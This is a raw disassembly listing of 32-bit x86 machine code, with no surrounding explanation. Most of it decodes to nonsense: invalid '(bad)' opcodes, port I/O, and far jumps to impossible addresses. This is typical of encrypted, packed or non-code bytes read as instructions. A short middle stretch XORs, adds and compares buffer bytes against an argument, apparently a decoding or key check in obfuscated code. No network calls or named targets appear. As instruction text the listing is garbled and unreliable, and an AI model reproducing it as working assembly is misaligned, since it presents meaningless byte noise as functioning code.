  410aa1:	or     DWORD PTR ds:0xc3bf43e7,ecx
  410aa7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410aa8:	cli    
  410aa9:	mov    esp,0xa531ecc7
  410aae:	or     ebp,ebx
  410ab0:	ss and eax,0xa0fb8e14
  410ab6:	aas    
  410ab7:	jecxz  0x410a63
  410ab9:	loop   0x410b0b
  410abb:	icebp  
  410abc:	push   ecx
  410abd:	fwait
  410abe:	pop    ds
  410abf:	je     0x410ab5
  410ac1:	mov    BYTE PTR [edx],0xdb
  410ac4:	shl    bh,cl
  410ac6:	xlat   BYTE PTR ds:[ebx]
  410ac7:	lods   eax,DWORD PTR ds:[esi]
  410ac8:	or     al,0xce
  410aca:	fndisi(8087 only) 
  410acc:	cmc    
  410acd:	mov    esi,0xd52c1ba
  410ad2:	ss ret 0x5759
  410ad6:	lock jl 0x410a96
  410ad9:	jl     0x410b16
  410adb:	inc    esp
  410adc:	mov    esp,0x3cef8b7f
  410ae1:	inc    ecx
  410ae2:	mov    esp,0xa5f96187
  410ae7:	push   ebp
  410ae8:	rcl    BYTE PTR [edi-0x312ed0a1],0x4c
  410aef:	dec    ebx
  410af0:	add    al,0xea
  410af2:	dec    esp
  410af3:	(bad)  
  410af4:	outs   dx,DWORD PTR ds:[esi]
  410af5:	sbb    DWORD PTR [ebx-0x77],eax
  410af8:	pop    edx
  410af9:	dec    ebp
  410afa:	dec    edx
  410afb:	cmp    dh,BYTE PTR [edx]
  410afd:	ins    DWORD PTR es:[edi],dx
  410afe:	adc    eax,0x7d72aa42
  410b03:	fwait
  410b04:	jae    0x410af0
  410b06:	xor    DWORD PTR [ebx-0x2e],esp
  410b09:	inc    esi
  410b0a:	pusha  
  410b0b:	inc    DWORD PTR [ebx+eax*4]
  410b0e:	cmp    bh,0x39
  410b11:	pop    esp
  410b12:	popf   
  410b13:	sbb    bh,ah
  410b15:	adc    BYTE PTR [esi-0x5bf9dc28],cl
  410b1b:	cwde   
  410b1c:	sub    eax,DWORD PTR [edi-0x39f396a3]
  410b22:	loopne 0x410b3a
  410b24:	or     eax,0x27e9ddee
  410b29:	inc    ebx
  410b2a:	mov    edi,0xc1b020a8
  410b2f:	add    DWORD PTR [ecx+0x6f7cab7b],esp
  410b35:	and    eax,0x34608d8b
  410b3a:	mov    esi,0x8148197
  410b3f:	jg     0x410b46
  410b41:	sti    
  410b42:	aad    0x80
  410b44:	or     DWORD PTR [eax-0xfbc4b59],esp
  410b4a:	xchg   ebp,eax
  410b4b:	test   DWORD PTR [ebp-0x4e533599],ecx
  410b51:	ins    BYTE PTR es:[edi],dx
  410b52:	in     al,dx
  410b53:	mov    bl,0xc9
  410b55:	sub    eax,0x72cfefd8
  410b5a:	pop    ebp
  410b5b:	call   0xa5c40f97
  410b60:	and    ah,ch
  410b62:	jns    0x410bca
  410b64:	xlat   BYTE PTR ds:[ebx]
  410b65:	fwait
  410b66:	lods   eax,DWORD PTR ds:[esi]
  410b67:	lahf   
  410b68:	xchg   ebp,eax
  410b69:	ret    0x4d94
  410b6c:	add    ecx,DWORD PTR ds:0x74461220
  410b72:	cmp    BYTE PTR [ecx+0x37ed5663],ch
  410b78:	add    dl,BYTE PTR [ebx]
  410b7a:	mov    ch,0xb2
  410b7c:	es cmp bl,0x74
  410b80:	or     ecx,DWORD PTR [edx-0x5c42458c]
  410b86:	cmp    dh,BYTE PTR [ecx]
  410b88:	mov    bh,0xca
  410b8a:	xor    al,0xba
  410b8c:	mov    edi,0xd671590
  410b91:	pusha  
  410b92:	aaa    
  410b93:	and    bh,bl
  410b95:	sti    
  410b96:	je     0x410ba3
  410b98:	add    edi,DWORD PTR [ebx-0x9600b65]
  410b9e:	fmul   st(7),st
  410ba0:	or     BYTE PTR [edi],ch
  410ba2:	pop    esi
  410ba3:	sub    edx,DWORD PTR [edx-0xf59854a]
  410ba9:	ins    BYTE PTR es:[edi],dx
  410baa:	or     edx,ebx
  410bac:	add    al,0x9
  410bae:	lds    edx,FWORD PTR [edi+edx*2]
  410bb1:	sub    DWORD PTR [ebx+ebp*4],edx
  410bb4:	pop    ds
  410bb5:	lahf   
  410bb6:	jle    0x410c01
  410bb8:	add    eax,0xaecfd943
  410bbd:	dec    ebp
  410bbe:	iret   
  410bbf:	shr    BYTE PTR [esi+0x2d],0x5a
  410bc3:	xor    DWORD PTR es:[edx-0xb],edx
  410bc7:	push   edx
  410bc8:	sahf   
  410bc9:	int    0xe9
  410bcb:	pop    es
  410bcc:	mov    WORD PTR [esi+0x2e],es
  410bcf:	mov    al,0x2e
  410bd1:	int    0x4c
  410bd3:	daa    
  410bd4:	push   eax
  410bd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410bd6:	xchg   esp,eax
  410bd7:	mov    ebp,0x3b306d36
  410bdc:	push   ebp
  410bde:	push   ebp
  410bdf:	sbb    BYTE PTR [ecx+0x23],ah
  410be2:	xlat   BYTE PTR ds:[ebx]
  410be3:	or     BYTE PTR [eax*8-0x15ffb3b7],0xb7
  410beb:	ins    DWORD PTR es:[edi],dx
  410bec:	cs pop esi
  410bee:	fisttp WORD PTR [ebp-0x1057fbad]
  410bf4:	mov    edi,0x865ae620
  410bf9:	or     bl,ch
  410bfb:	test   al,0xf1
  410bfd:	fbstp  TBYTE PTR [edi]
  410bff:	mov    edx,ebp
  410c01:	scas   eax,DWORD PTR es:[edi]
  410c02:	sub    DWORD PTR [edx+0x16],ebp
  410c05:	into   
  410c06:	or     BYTE PTR [edx+0x4f],0x82
  410c0a:	jbe    0x410ba0
  410c0c:	mov    ds:0xb9cf170f,eax
  410c11:	out    dx,al
  410c12:	add    BYTE PTR [edx+edi*1+0x224d32b8],dh
  410c19:	in     eax,dx
  410c1a:	imul   esp,DWORD PTR [edi],0xc4d3c2f2
  410c20:	pop    ecx
  410c21:	inc    ebx
  410c22:	mov    eax,ds:0x3b4293c9
  410c27:	shr    BYTE PTR [ebp+0x2d],0x10
  410c2b:	or     al,0x3d
  410c2d:	hlt    
  410c2e:	sbb    al,0xf5
  410c30:	pop    eax
  410c31:	imul   esi,ecx,0xffffffc3
  410c34:	ret    
  410c35:	cmp    eax,0x58a86ca9
  410c3a:	mov    bl,0x58
  410c3c:	not    cl
  410c3e:	test   BYTE PTR [ecx-0x19d403d1],bh
  410c44:	mov    ds:0x317242bf,al
  410c49:	in     eax,dx
  410c4a:	xor    cl,BYTE PTR [esi]
  410c4c:	das    
  410c4d:	add    eax,0x503347d9
  410c52:	or     al,0x11
  410c54:	or     edx,edi
  410c56:	sahf   
  410c57:	sbb    ch,BYTE PTR [esi-0x65]
  410c5a:	in     eax,dx
  410c5b:	pop    edx
  410c5c:	gs dec bp
  410c5f:	leave  
  410c60:	adc    DWORD PTR [ebx-0xd20d6d6],0x6bbceeb9
  410c6a:	cmp    DWORD PTR [edx+0x5c],0xb0bc881c
  410c71:	fcmovnbe st,st(3)
  410c73:	stos   DWORD PTR es:[edi],eax
  410c74:	jae    0x410c13
  410c76:	mov    al,0x85
  410c78:	enter  0x1504,0x5b
  410c7c:	icebp  
  410c7d:	in     eax,0x46
  410c7f:	in     eax,0xd
  410c81:	pop    ebp
  410c82:	iret   
  410c83:	lods   eax,DWORD PTR ds:[esi]
  410c84:	clc    
  410c85:	ins    BYTE PTR es:[edi],dx
  410c86:	shl    BYTE PTR [esi-0x74],cl
  410c89:	dec    ebx
  410c8a:	xchg   DWORD PTR [eax+0x20],ebp
  410c8d:	jo     0x410d04
  410c8f:	or     edx,DWORD PTR [ecx+0x17]
  410c92:	nop
  410c93:	int    0xba
  410c95:	mov    eax,0x263f5bda
  410c9a:	xor    dh,BYTE PTR es:[ebx-0x4]
  410c9e:	mov    bh,BYTE PTR ds:0x20c8abcf
  410ca4:	es dec ebp
  410ca6:	jg     0x410cf8
  410ca8:	test   dh,ah
  410caa:	jo     0x410cba
  410cac:	(bad)  
  410cad:	pop    eax
  410cae:	add    DWORD PTR [ebx],ecx
  410cb0:	xlat   BYTE PTR ds:[ebx]
  410cb1:	sub    eax,0x9a55a473
  410cb6:	daa    
  410cb7:	(bad)  [edx-0x7f72c79e]
  410cbd:	mov    DWORD PTR [edx-0x29],esi
  410cc0:	call   0x279:0xa1c3c87e
  410cc7:	(bad)  
  410cc8:	daa    
  410cc9:	cmp    eax,0x131e1273
  410cce:	xchg   edx,eax
  410ccf:	dec    edi
  410cd0:	(bad)  
  410cd1:	adc    eax,DWORD PTR [eax-0x565aa49f]
  410cd7:	xchg   DWORD PTR [edx],ebp
  410cd9:	jne    0x410d19
  410cdb:	dec    edi
  410cdc:	jbe    0x410ce5
  410cde:	mov    ch,0x9a
  410ce0:	jmp    0x410d46
  410ce2:	dec    esi
  410ce3:	int    0x95
  410ce5:	dec    ebp
  410ce6:	jl     0x410c6e
  410ce8:	cli    
  410ce9:	aam    0x28
  410ceb:	ret    
  410cec:	icebp  
  410ced:	adc    al,0x93
  410cef:	inc    esi
  410cf0:	adc    ebx,ecx
  410cf2:	lahf   
  410cf3:	test   BYTE PTR [eax+0x3caf9307],al
  410cf9:	pushf  
  410cfa:	cmp    al,BYTE PTR [esi-0x6b29bbfd]
  410d00:	loope  0x410ca4
  410d02:	xchg   ebp,eax
  410d03:	sahf   
  410d04:	pop    edx
  410d05:	xchg   edx,eax
  410d06:	shl    BYTE PTR [esi],cl
  410d08:	xchg   DWORD PTR [edi+0x28968f1],edx
  410d0e:	mov    eax,DWORD PTR [ebp-0x8]
  410d11:	jmp    0x410fdf
  410d16:	je     0x410d40
  410d18:	(bad)  
  410d19:	push   cs
  410d1a:	push   edx
  410d1b:	lock je 0x410d8e
  410d1e:	outs   dx,BYTE PTR ds:[esi]
  410d1f:	dec    ecx
  410d20:	mov    edi,0xcb42a29c
  410d25:	xchg   ebx,eax
  410d26:	jmp    0x410ce0
  410d28:	jle    0x410da8
  410d2a:	scas   eax,DWORD PTR es:[edi]
  410d2b:	jl     0x410dab
  410d2d:	jle    0x410d59
  410d2f:	mov    dh,0xc6
  410d31:	jmp    FWORD PTR [eax]
  410d33:	or     DWORD PTR [edi-0x2d],edx
  410d36:	lock inc ebp
  410d38:	test   DWORD PTR [ebp+0x4a],ebx
  410d3b:	and    esp,DWORD PTR [ebp-0x64]
  410d3e:	cmc    
  410d3f:	call   0x1297:0x8b2bbc06
  410d46:	jl     0x410cd3
  410d48:	lds    edi,FWORD PTR [ebx+0x229c8360]
  410d4e:	fild   DWORD PTR [ebx]
  410d50:	jle    0x410d10
  410d52:	or     DWORD PTR [eax+0x3b],ebp
  410d55:	inc    ebp
  410d56:	mov    BYTE PTR fs:[ecx],ah
  410d59:	sub    DWORD PTR [ebx+0x12],esp
  410d5c:	imul   esp,esi,0x50
  410d5f:	shl    DWORD PTR [ecx],0x1e
  410d62:	pop    eax
  410d63:	pop    ss
  410d64:	mov    ds:0x57389ab8,al
  410d69:	rcr    bl,1
  410d6b:	test   bl,dh
  410d6d:	ret    0x5c0c
  410d70:	enter  0xa10b,0x2b
  410d74:	lods   al,BYTE PTR ds:[esi]
  410d75:	fwait
  410d76:	mov    ds:0xe5651c89,al
  410d7b:	mov    al,0xa6
  410d7d:	sub    esp,DWORD PTR [eax-0x2aaacc3d]
  410d83:	push   0x9fcfdae4
  410d88:	(bad)  
  410d89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d8a:	jne    0x410d86
  410d8c:	cmc    
  410d8d:	add    DWORD PTR [edi-0x3d77b80a],ecx
  410d93:	mov    al,0xed
  410d95:	stos   BYTE PTR es:[edi],al
  410d96:	stos   DWORD PTR es:[edi],eax
  410d97:	jmp    0x410d53
  410d99:	adc    al,0x78
  410d9b:	adc    esp,ebp
  410d9d:	cmp    al,0x24
  410d9f:	push   0xffffff81
  410da1:	xchg   ebx,eax
  410da2:	lea    esp,[edx+0x76]
  410da5:	dec    esp
  410da6:	sub    BYTE PTR [ebp+0x673d94a1],al
  410dac:	shl    BYTE PTR [ebx],cl
  410dae:	mov    cs,WORD PTR [edi-0x5]
  410db1:	push   0xc0ae4cdc
  410db6:	push   0x1b1892da
  410dbb:	push   es
  410dbc:	cmp    eax,DWORD PTR [esi+0x5611a61c]
  410dc2:	inc    esp
  410dc3:	sahf   
  410dc4:	retf   0x5c50
  410dc7:	mov    eax,ds:0x1fbaeb0d
  410dcc:	cmc    
  410dcd:	jecxz  0x410e1d
  410dcf:	enter  0x16e7,0xe8
  410dd3:	inc    al
  410dd5:	repnz popf 
  410dd7:	loope  0x410df2
  410dd9:	cwde   
  410dda:	sahf   
  410ddb:	add    al,0xe7
  410ddd:	xchg   edi,eax
  410dde:	pop    ebp
  410ddf:	ins    DWORD PTR es:[edi],dx
  410de0:	sub    BYTE PTR [edx+esi*8+0x6bd9d6e7],ch
  410de7:	dec    esp
  410de8:	mov    dh,0xa3
  410dea:	shl    DWORD PTR [ecx+0x61635b9a],0x58
  410df1:	inc    edx
  410df2:	xor    eax,0x656e378d
  410df7:	sub    ebx,DWORD PTR [esp+ecx*1-0x38083c95]
  410dfe:	push   edx
  410dff:	inc    edx
  410e00:	cmp    al,0x90
  410e02:	push   es
  410e03:	je     0x410e1a
  410e05:	jle    0x410e1e
  410e07:	push   edi
  410e08:	out    0xa0,eax
  410e0a:	in     eax,0x17
  410e0c:	and    DWORD PTR [edi+0x31],esp
  410e0f:	or     DWORD PTR [ebx],esi
  410e11:	pop    esi
  410e12:	fucomi st,st(3)
  410e14:	sbb    eax,0xd63981cc
  410e19:	retf   0x4d4f
  410e1c:	sub    BYTE PTR [edx-0xb],al
  410e1f:	icebp  
  410e20:	jge    0x410da7
  410e22:	lods   al,BYTE PTR ds:[esi]
  410e23:	ins    DWORD PTR es:[edi],dx
  410e24:	lds    edi,FWORD PTR [ebx-0x3e]
  410e27:	aam    0x53
  410e29:	adc    dh,al
  410e2b:	std    
  410e2c:	sbb    edi,edx
  410e2e:	mov    ecx,0xfea3194a
  410e33:	aam    0xcb
  410e35:	cwde   
  410e36:	mov    ecx,0xcb6f00fb
  410e3b:	cdq    
  410e3c:	aaa    
  410e3d:	fiadd  DWORD PTR ds:0xdf0c4eb7
  410e43:	mov    dl,0x18
  410e45:	xchg   esi,eax
  410e46:	fisubr DWORD PTR [ebx-0x4b]
  410e49:	int    0x24
  410e4b:	les    eax,FWORD PTR [ebp-0x11ffb3e6]
  410e51:	push   ebp
  410e52:	add    BYTE PTR [eax+0x63],bl
  410e55:	or     BYTE PTR [ecx+0x69],bh
  410e58:	data16 fist WORD PTR [ecx-0x61]
  410e5c:	jecxz  0x410deb
  410e5e:	push   cs
  410e5f:	mov    ds:0xdbf08431,eax
  410e64:	idiv   DWORD PTR [eax-0x77]
  410e67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e68:	leave  
  410e69:	arpl   WORD PTR [eax],di
  410e6b:	ins    BYTE PTR es:[edi],dx
  410e6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e6d:	mov    eax,ds:0xf243f078
  410e72:	push   eax
  410e73:	sbb    edx,edi
  410e75:	xchg   DWORD PTR [esi],ecx
  410e77:	repz inc ebp
  410e79:	les    eax,FWORD PTR [ebp-0x4]
  410e7c:	and    BYTE PTR [ecx+0xc],0x99
  410e80:	xchg   ebx,eax
  410e81:	pop    ebx
  410e82:	sub    BYTE PTR [eax],dl
  410e84:	jge    0x410ecd
  410e86:	(bad)  
  410e87:	adc    eax,0xe045a63c
  410e8c:	jae    0x410ef7
  410e8e:	lea    esi,[ecx]
  410e90:	call   0x742caa83
  410e95:	in     eax,dx
  410e96:	pop    edx
  410e97:	and    eax,0x160bdb18
  410e9c:	leave  
  410e9d:	inc    ebp
  410e9e:	imul   esp,DWORD PTR [ebp-0x77b8fbf4],0x3069dc3d
  410ea8:	pop    ecx
  410ea9:	mov    ebp,0x55b59f29
  410eae:	or     al,0x9b
  410eb0:	mov    bl,0x74
  410eb2:	dec    esp
  410eb3:	mov    bh,0xd
  410eb5:	and    BYTE PTR [edx],dh
  410eb7:	sbb    al,0xc7
  410eb9:	(bad)  
  410eba:	sub    BYTE PTR [edx+0x25],dl
  410ebd:	test   BYTE PTR [edx],ch
  410ebf:	pop    ebp
  410ec0:	xchg   esp,eax
  410ec1:	sub    al,0x91
  410ec3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ec4:	call   0xb17ffb5e
  410ec9:	aas    
  410eca:	mov    esi,0x8aa95a43
  410ecf:	cmp    al,0x58
  410ed1:	cdq    
  410ed2:	mov    esp,0x5c1c92f7
  410ed7:	and    edx,DWORD PTR [ebp+ebx*8-0x2d5e09ff]
  410ede:	push   esi
  410edf:	out    0x39,al
  410ee1:	aad    0xab
  410ee3:	or     al,BYTE PTR [bx+di+0x2b]
  410ee7:	jmp    DWORD PTR [eax-0x61]
  410eea:	jmp    0x1160616d
  410eef:	sahf   
  410ef0:	xor    BYTE PTR [ebx],0x63
  410ef3:	mov    ebp,0xf8e12887
  410ef8:	mov    ?,WORD PTR [ebx]
  410efa:	movlps QWORD PTR [edi+0x60],xmm2
  410efe:	test   eax,0x65e7406b
  410f03:	aas    
  410f04:	outs   dx,DWORD PTR ds:[esi]
  410f05:	adc    al,0x3d
  410f07:	mov    dl,0x9f
  410f09:	aad    0x7e
  410f0b:	outs   dx,BYTE PTR ds:[esi]
  410f0c:	pop    ds
  410f0d:	mov    ebx,0x97aa9b98
  410f12:	ror    DWORD PTR [ebx],0x7c
  410f15:	push   ebx
  410f16:	out    dx,al
  410f17:	int3   
  410f18:	dec    ebp
  410f19:	add    BYTE PTR [ebx-0x2c7f152a],cl
  410f1f:	(bad)  
  410f20:	and    BYTE PTR [edi+ebx*1+0x14fe5fb1],ah
  410f27:	mov    cl,0x98
  410f29:	mov    bl,0x0
  410f2b:	lods   al,BYTE PTR ds:[esi]
  410f2c:	cld    
  410f2d:	xchg   esp,edi
  410f2f:	mov    ebx,DWORD PTR [esi]
  410f31:	adc    esi,0x34e04bb1
  410f37:	pop    esp
  410f38:	and    ebp,edx
  410f3a:	je     0x410f0f
  410f3c:	dec    ebp
  410f3d:	stc    
  410f3e:	cmc    
  410f3f:	int    0xb4
  410f41:	jp     0x410f3f
  410f43:	leave  
  410f44:	enter  0xf2fa,0xf9
  410f48:	arpl   WORD PTR [eax+0x1c],sp
  410f4b:	mov    al,0x35
  410f4d:	xor    eax,0x3d1f3194
  410f52:	lods   al,BYTE PTR ds:[esi]
  410f53:	daa    
  410f54:	sub    BYTE PTR [ecx+0xe],cl
  410f57:	in     al,0x2d
  410f59:	jns    0x410ee2
  410f5b:	mov    ds:0xf29684bb,eax
  410f60:	cmc    
  410f61:	adc    DWORD PTR [esi],esp
  410f63:	ret    
  410f64:	jns    0x410fda
  410f66:	pop    eax
  410f67:	dec    esi
  410f68:	cmp    al,0x15
  410f6a:	push   cs
  410f6b:	inc    esi
  410f6c:	dec    eax
  410f6d:	xlat   BYTE PTR ds:[ebx]
  410f6e:	pop    ebp
  410f6f:	call   0x1d156474
  410f74:	out    dx,eax
  410f75:	push   esi
  410f76:	dec    edi
  410f77:	pop    ecx
  410f78:	cli    
  410f79:	mov    dh,BYTE PTR fs:[ecx+0x7e3a7826]
  410f80:	cli    
  410f81:	lahf   
  410f82:	mov    eax,ds:0x285855bd
  410f87:	lahf   
  410f88:	call   0x91b1ba31
  410f8d:	stos   BYTE PTR es:[edi],al
  410f8e:	xor    cl,BYTE PTR [edx+ecx*8]
  410f91:	(bad)  [ebx*8+0x467ebc21]
  410f98:	mov    bl,0x8
  410f9a:	(bad)  
  410f9b:	push   esp
  410f9c:	mov    ebx,0xa66cc5d
  410fa1:	inc    ebp
  410fa2:	cmp    cl,BYTE PTR [edx-0x53]
  410fa5:	popf   
  410fa6:	sti    
  410fa7:	dec    ebx
  410fa8:	lods   al,BYTE PTR ds:[esi]
  410fa9:	cli    
  410faa:	push   edi
  410fab:	xchg   BYTE PTR [esi+0x179a3711],dh
  410fb1:	leave  
  410fb2:	mov    edi,0xf43a252b
  410fb7:	fwait
  410fb8:	shr    BYTE PTR [ebx-0x55],0xd5
  410fbc:	cld    
  410fbd:	lds    ecx,FWORD PTR [ebp+0x2e]
  410fc0:	lock and al,0xa6
  410fc3:	and    al,0x33
  410fc5:	pop    ebp
  410fc6:	sub    eax,0x215ba4cf
  410fcb:	and    DWORD PTR [ecx],ebx
  410fcd:	aaa    
  410fce:	loop   0x410fab
  410fd0:	sub    BYTE PTR [eax],dh
  410fd2:	imul   ebx,DWORD PTR [edx],0xebb8c09c
  410fd8:	dec    BYTE PTR [edi]
  410fda:	sbb    BYTE PTR [esi],dh
  410fdc:	pop    ebx
  410fdd:	cdq    
  410fde:	pop    ebx
  410fdf:	xor    eax,ecx
  410fe1:	add    eax,esi
  410fe3:	mov    DWORD PTR [ebp+0x8],eax
  410fe6:	mov    eax,DWORD PTR [ebp+0x8]
  410fe9:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fed:	mov    dl,BYTE PTR [ebp-0x1]
  410ff0:	cmp    al,dl
  410ff2:	je     0x411303
  410ff8:	mov    eax,DWORD PTR [ebp+0x8]
  410ffb:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fff:	mov    edx,DWORD PTR [ebp+0xc]
  411002:	cmp    al,BYTE PTR [edx]
  411004:	jne    0x4115f7
  41100a:	mov    eax,DWORD PTR [ebp-0x8]
  41100d:	mov    edx,DWORD PTR [ebp+0xc]
  411010:	movsx  edx,BYTE PTR [edx]
  411013:	xor    eax,ecx
  411015:	add    eax,esi
  411017:	cmp    edx,eax
  411019:	jmp    0x4112e7
  41101e:	jmp    0x411054
  411020:	push   esp
  411021:	dec    ebx
  411022:	push   ecx
  411023:	imul   esi,ecx,0xffffffb4
  411026:	and    DWORD PTR [edx-0x16],esi
  411029:	loope  0x411007
  41102b:	add    al,0xb9
  41102d:	xor    eax,0x7e7e4718
  411032:	scas   eax,DWORD PTR es:[edi]
  411033:	jl     0x4110b3
  411035:	jle    0x410fc7
  411037:	pushf  
  411038:	cmp    eax,0xd9c096a9
  41103d:	mov    ds:0xf78f8e48,al
  411042:	mov    ecx,0x9e001b6
  411047:	jae    0x411093
  411049:	push   edx
  41104a:	std    
  41104b:	fistp  DWORD PTR [esi-0x53709ad5]
  411051:	jns    0x411027
  411053:	int3   
  411054:	mov    al,ds:0x5318f1e4
  411059:	shl    DWORD PTR [eax],1
  41105b:	sbb    ebp,esp
  41105d:	frstor [edi]
  41105f:	add    al,BYTE PTR [edi+edx*2-0x4d]
  411063:	jmp    0x12e12690
  411068:	xor    eax,0x20466bf
  41106d:	ins    BYTE PTR es:[edi],dx
  41106e:	adc    bh,cl
  411070:	add    bl,BYTE PTR [eax-0x60]
  411073:	jp     0x4110a6
  411075:	sub    BYTE PTR [ebp-0x49],dl
  411078:	cmc    
  411079:	shl    DWORD PTR [esi-0x14bb7fce],cl
  41107f:	or     al,0xb1
  411081:	bound  ebx,QWORD PTR [ebx]
  411083:	icebp  
  411084:	pop    es
  411085:	mov    edx,0x460b131b
  41108a:	mov    bh,BYTE PTR [ebx-0x66cfb50a]
  411090:	cmp    ebx,DWORD PTR [edx+0xd]
  411093:	fstp   st(6)
  411095:	shl    DWORD PTR [edx+edx*1+0x6a],1
  411099:	adc    BYTE PTR [eax+ebp*2],0x91
  41109d:	neg    BYTE PTR [ebx-0x9]
  4110a0:	and    eax,0x53340b19
  4110a5:	sbb    al,0xa3
  4110a7:	fnstcw WORD PTR [edx-0x2c]
  4110aa:	jmp    0x41108b
  4110ac:	in     eax,dx
  4110ad:	jmp    0x23e25769
  4110b2:	jp     0x411043
  4110b4:	retf   
  4110b5:	mov    DWORD PTR [ebx+0x39],edx
  4110b8:	inc    esi
  4110b9:	jne    0x41103d
  4110bb:	push   ecx
  4110bc:	dec    DWORD PTR [ecx]
  4110be:	bound  edx,QWORD PTR [esi+0x184e6f8e]
  4110c4:	(bad)  
  4110c5:	jge    0x411048
  4110c7:	repz mov ds:0x2de3eb02,eax
  4110cd:	pop    ss
  4110ce:	and    DWORD PTR [ebx-0x5fcf0d00],esi
  4110d4:	aad    0xf5
  4110d6:	fsubr  DWORD PTR [edi-0x5c]
  4110d9:	fcomp  st(3)
  4110db:	jle    0x41114f
  4110dd:	mov    ch,0x69
  4110df:	mov    bl,0x1e
  4110e1:	leave  
  4110e2:	mov    esp,0x11c9fc80
  4110e7:	fdiv   DWORD PTR [ebx-0x5a]
  4110ea:	repnz mov dl,BYTE PTR [ecx]
  4110ed:	(bad)  
  4110ee:	fdivr  DWORD PTR [esi]
  4110f0:	(bad)  
  4110f1:	pusha  
  4110f2:	leave  
  4110f3:	das    
  4110f4:	arpl   si,sp
  4110f6:	pop    ebx
  4110f7:	jmp    0xd34aec8d
  4110fc:	out    0x41,eax
  4110fe:	mov    ds:0x3e304285,eax
  411103:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411104:	adc    esi,DWORD PTR [eax-0x502251f9]
  41110a:	loop   0x411181
  41110c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41110d:	mov    ecx,0x81e47d8b
  411112:	jbe    0x411150
  411114:	push   ebp
  411115:	jo     0x4110df
  411117:	imul   esi,DWORD PTR [ecx+0x2d],0xd04085bd
  41111e:	mov    gs,WORD PTR [edx-0x61]
  411121:	mov    ecx,0x270dcd51
  411126:	xor    bh,cl
  411128:	add    BYTE PTR [eax-0x62ddc128],al
  41112e:	dec    edx
  41112f:	jmp    0x411132
  411131:	pusha  
  411132:	cmp    al,0xec
  411134:	div    BYTE PTR [edx+0x3352feb6]
  41113a:	loopne 0x411122
  41113c:	ror    DWORD PTR ds:0x2cd0010,1
  411142:	out    0x48,al
  411144:	lds    esi,FWORD PTR ds:0xcb67d7af
  41114a:	or     BYTE PTR [edi],al
  41114c:	jb     0x4111c5
  41114e:	in     eax,0xa4
  411150:	mov    esp,0xeb657716
  411155:	push   eax
  411156:	int    0xf0
  411158:	adc    DWORD PTR [eax-0x3087338c],ebp
  41115e:	ss test eax,0x90b4e0c8
  411164:	hlt    
  411165:	mov    es,edi
  411167:	lods   eax,DWORD PTR ds:[esi]
  411168:	into   
  411169:	inc    esi
  41116a:	xchg   edi,eax
  41116b:	inc    edi
  41116c:	inc    ebx
  41116d:	dec    esi
  41116e:	out    dx,eax
  41116f:	(bad)  
  411170:	fistp  QWORD PTR ds:0xbc6036aa
  411176:	nop
  411177:	dec    ebx
  411178:	jmp    0x180d:0x1a34001e
  41117f:	mov    esp,0x9fa088a0
  411184:	jbe    0x41114d
  411186:	shr    DWORD PTR ds:0x4ea3d4b5,cl
  41118c:	xor    esp,DWORD PTR [edi+0x1a]
  41118f:	in     eax,0x30
  411191:	sub    BYTE PTR [eax],dh
  411193:	enter  0x67bc,0x40
  411197:	daa    
  411198:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411199:	ret    
  41119a:	cwde   
  41119b:	sub    al,0x19
  41119d:	jbe    0x411199
  41119f:	sti    
  4111a0:	ficom  WORD PTR [ecx-0x71]
  4111a3:	dec    edx
  4111a4:	in     al,0xad
  4111a6:	pop    ds
  4111a7:	cmp    DWORD PTR [ecx-0xe45583c],ebp
  4111ad:	mov    fs,WORD PTR [ecx-0x1eab8]
  4111b3:	or     eax,0xb3878a51
  4111b8:	pop    eax
  4111b9:	sub    eax,0xf7fb4146
  4111be:	jg     0x411175
  4111c0:	sbb    edx,DWORD PTR [edx+0x6b]
  4111c3:	and    al,0xd4
  4111c5:	jle    0x411148
  4111c7:	fprem  
  4111c9:	idiv   BYTE PTR [esi]
  4111cb:	repnz sub DWORD PTR ds:0xf1b1342c,esp
  4111d2:	shr    bh,0xa4
  4111d5:	int    0x70
  4111d7:	inc    esi
  4111d8:	pop    edx
  4111d9:	dec    esi
  4111da:	push   0xcf6b33b9
  4111df:	inc    ebp
  4111e0:	dec    esi
  4111e1:	push   edi
  4111e2:	fwait
  4111e3:	dec    eax
  4111e4:	cmp    DWORD PTR [ebx],eax
  4111e6:	gs jns 0x4111ac
  4111e9:	adc    al,0x92
  4111eb:	pusha  
  4111ec:	inc    edx
  4111ed:	fild   DWORD PTR [ecx]
  4111ef:	dec    ebp
  4111f0:	push   esp
  4111f1:	icebp  
  4111f2:	fld    TBYTE PTR [edi]
  4111f5:	test   DWORD PTR [eax],edi
  4111f7:	fldenv [edi+0x52]
  4111fa:	enter  0x186e,0x5
  4111fe:	setns  BYTE PTR [ebx-0x42380d66]
  411205:	fs jne 0x41123b
  411208:	imul   ecx,DWORD PTR [esi+0x272a9064],0x564a752a
  411212:	xor    DWORD PTR [eax],0xa19c3ca
  411218:	out    dx,al
  411219:	xor    DWORD PTR [ebx],ebp
  41121b:	mov    dl,0x25
  41121d:	or     al,0xba
  41121f:	or     DWORD PTR [esi],edx
  411221:	fimul  DWORD PTR [esi+eiz*2+0x5c]
  411225:	push   0x76
  411227:	jnp    0x4111b0
  411229:	xor    al,0x2
  41122b:	mov    al,ds:0x25878643
  411230:	sahf   
  411231:	mov    ebp,0x1aa4ca5c
  411236:	fs out dx,al
  411238:	sbb    DWORD PTR [esi-0x8],0xef58b474
  41123f:	int3   
  411240:	jp     0x4111db
  411242:	loope  0x4111e1
  411244:	pop    edi
  411245:	popf   
  411246:	adc    ch,0xdb
  411249:	shl    DWORD PTR [esi+0x417d59c9],0xa7
  411250:	cmp    eax,0x756f8c50
  411255:	retf   
  411256:	popa   
  411257:	popa   
  411258:	int3   
  411259:	xchg   esi,eax
  41125a:	mov    ds:0x7afc750b,eax
  41125f:	xor    eax,0xff4b914d
  411264:	dec    edx
  411265:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411266:	inc    esi
